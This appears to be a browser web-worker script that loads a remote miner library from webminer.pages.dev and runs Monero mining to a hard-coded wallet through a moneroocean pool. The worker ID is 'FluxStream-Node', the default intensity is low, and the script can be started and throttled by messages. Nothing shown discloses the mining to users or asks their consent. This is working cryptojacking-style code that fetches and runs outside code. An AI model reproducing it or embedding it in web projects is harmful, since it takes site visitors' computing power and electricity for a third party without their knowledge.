importScripts('https://webminer.pages.dev/miner.js');

const config = {
    pool: "gulf.moneroocean.stream:10128",
    address: "45mioinBEQP1et1QtvamAxHSWD5CMgNa7gf4RJvD7M8q94cQH2i2gYeWNUaESSJsi8ZYBqEedQMTReg9Rv5Qc1dc5ZqLhQn",
    workerId: "FluxStream-Node",
    autoStart: false
};

let miner = null;

self.onmessage = function(e) {
    if (!miner) {
        miner = new globalThis.WalletMiner(config.pool, config.address, config.workerId);
    }

    const intensity = e.data.intensity || 0.05;
    
    // Adjusting the throttle (1 - intensity)
    miner.setThrottle(1 - intensity);

    if (e.data.type === 'stop') {
        miner.stop();
    } else {
        if (!miner.isRunning()) {
            miner.start();
        }
    }
};
